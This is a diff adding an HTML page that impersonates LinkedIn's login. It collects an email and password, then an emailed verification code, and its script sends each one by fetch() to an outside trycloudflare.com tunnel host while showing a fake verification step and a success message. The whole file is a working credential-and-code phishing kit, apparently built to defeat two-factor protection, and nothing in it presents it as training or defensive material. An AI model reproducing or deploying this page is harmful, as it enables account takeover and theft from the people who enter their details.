@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Linkedin Login</title>
+  <style>
+    /* your CSS styling stays unchanged */
+  </style>
+</head>
+<body>
+
+  <div class="container" id="loginStep">
+    <h1>Join LinkedIn now — it’s free!</h1>
+    <form id="loginForm">
+      <label for="email">Email</label>
+      <input type="text" id="email" name="email" required />
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required />
+      <div class="checkbox">
+        <input type="checkbox" id="stay" />
+        <label for="stay"> Keep me logged in</label>
+      </div>
+      <button type="submit">Continue</button>
+    </form>
+
+    <div class="google-login">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google logo" />
+      Continue with Google
+    </div>
+
+    <div class="footer-links">
+      Already on LinkedIn? <a href="#">Sign in</a><br />
+      Looking to create a page for a business? <a href="#">Get help</a>
+    </div>
+  </div>
+
+  <div class="container" id="verificationStep" style="display: none;">
+    <h1>Let's do a quick verification</h1>
+    <p>Please enter the code sent to your email address.</p>
+    <form id="codeForm">
+      <input type="text" id="codeInput" placeholder="Enter code" required />
+      <button type="submit">Submit</button>
+    </form>
+    <p style="margin-top: 15px;">
+      Lost access to your email? <a href="#">Verify your identity</a>
+    </p>
+  </div>
+
+<script>
+  const loginForm = document.getElementById("loginForm");
+  const loginStep = document.getElementById("loginStep");
+  const verificationStep = document.getElementById("verificationStep");
+  const codeForm = document.getElementById("codeForm");
+
+  // Submit login
+  loginForm.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    if (email && password) {
+      fetch("https://prostores-annotated-iii-ver.trycloudflare.com/login", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Response from backend:", data);
+        loginStep.style.display = "none";
+        verificationStep.style.display = "block";
+      })
+      .catch(error => {
+        console.error("Network error:", error);
+        alert("Network Error. Please make sure your backend is running.");
+      });
+    }
+  });
+
+  // Submit verification
+  codeForm.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const code = document.getElementById("codeInput").value;
+
+    fetch("https://prostores-annotated-iii-ver.trycloudflare.com/verify", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ code })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("Verification response:", data);
+      alert("Verification successful. Thank you!");
+    })
+    .catch(error => {
+      console.error("Network error during verification:", error);
+      alert("Network Error. Please make sure your backend is running.");
+    });
+  });
+</script>
+
+</body>
+</html>
